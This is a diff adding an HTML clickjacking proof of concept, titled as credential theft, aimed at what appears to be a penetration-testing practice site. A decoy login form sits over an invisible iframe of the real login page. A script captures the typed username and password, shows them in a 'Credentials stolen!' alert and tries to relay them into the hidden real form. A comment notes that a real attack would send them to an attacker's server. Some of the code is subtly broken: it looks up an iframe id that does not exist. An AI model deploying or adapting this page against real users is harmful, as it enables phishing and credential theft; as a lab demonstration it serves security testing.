@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Clickjacking PoC - Credential Theft</title>
+
+  <!-- Google Font (for modern look) -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      background-image: url('https://github.com/PP5334/Ethical-Testing-Application/raw/5cc51a4f5308ef7ffe8a2e947ec3cec151978c0c/login_1.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+    }
+
+    /* Invisible iframe for the real form */
+    iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%; /* Make it fill the page */
+        height: 100%;
+        border: none;
+        z-index: 1; /* Underneath the fake form */
+        opacity: 0; /* Completely invisible */
+    }
+    div {
+        position:absolute;
+        top:500px;
+        left:500px;
+        z-index: 1;
+    }
+
+    /* Decoy form container */
+    #decoy-form-container {
+      position: absolute;
+      top: 20px;
+      left: 45px;
+      z-index: 2;
+      background: rgba(0, 0, 0, 0.8);
+      padding: 90px 198px;
+      border-radius: 8px;
+      color: #fff;
+      width: 300px;
+    }
+
+    #decoy-form-container h2 {
+      margin-bottom: 25px;
+      font-size: 26px;
+      font-weight: 600;
+    }
+
+    label {
+      font-size: 14px;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid #fff;
+      color: white;
+      font-size: 14px;
+      width: 100%;
+      padding: 8px 0;
+      margin-bottom: 25px;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: #ccc;
+    }
+
+    input[type="submit"] {
+      background-color: #ffb400;
+      border: none;
+      color: white;
+      padding: 12px 0;
+      font-size: 16px;
+      border-radius: 5px;
+      width: 100%;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #e6a100;
+    }
+
+    #register-link {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      position:absolute;
+      right:89px
+    }
+
+    #register-link a {
+      color: white;
+      text-decoration: underline;
+      font-weight: 300;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Invisible iframe loading the real login page -->
+  <iframe sandbox="allow-forms" src="https://hackzone.sumasoft-pentest.com/user/login.php"></iframe>
+
+  <!-- 2. The fake login form the user sees and interacts with -->
+  <div id="decoy-form-container">
+    <h2>Login</h2>
+    <form id="decoy-form">
+      <label for="decoy-username">Email</label>
+      <input type="text" id="decoy-username" name="username" placeholder="Email" required>
+
+      <label for="decoy-password">Password</label>
+      <input type="password" id="decoy-password" name="password" placeholder="Password" required>
+
+      <input type="submit" value="Login">
+    </form>
+    <div id="register-link">
+      <a href="#">Register</a>
+    </div>
+  </div>
+
+  <!-- JavaScript for clickjacking credential relay -->
+  <script>
+    // 3. The credential stealing and form submission logic
+        document.getElementById('decoy-form').addEventListener('submit', function(e) {
+            // Prevent the fake form from actually submitting and reloading the page
+            e.preventDefault();
+
+            // Grab the credentials from the fake form
+            var username = document.getElementById('decoy-username').value;
+            var password = document.getElementById('decoy-password').value;
+
+            // --- ATTACKER'S ACTION: STEAL CREDENTIALS ---
+            // In a real attack, this would send the credentials to the attacker's server.
+            // For our PoC, we will just display an alert to prove we have them.
+            alert("Credentials stolen!\nUsername: " + username + "\nPassword: " + password);
+            
+            // --- VICTIM'S DECEPTION: SUBMIT THE REAL FORM ---
+            // Access the content of the iframe
+            var iframe = document.getElementById('vulnerable-iframe');
+            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+
+            // Find the real username and password fields inside the iframe
+            // NOTE: You may need to inspect the real login page to find the correct IDs or names
+            var realUsernameInput = iframeDoc.querySelector('input[name="username"]'); 
+            var realPasswordInput = iframeDoc.querySelector('input[name="password"]');
+            var realForm = iframeDoc.querySelector('form');
+
+            if (realUsernameInput && realPasswordInput && realForm) {
+                // Set the values in the real form
+                realUsernameInput.value = username;
+                realPasswordInput.value = password;
+                
+                // Submit the real form
+                realForm.submit();
+            } else {
+                alert("Could not find the real form elements inside the iframe.");
+            }
+        });
+  </script>
+
+</body>
+</html>
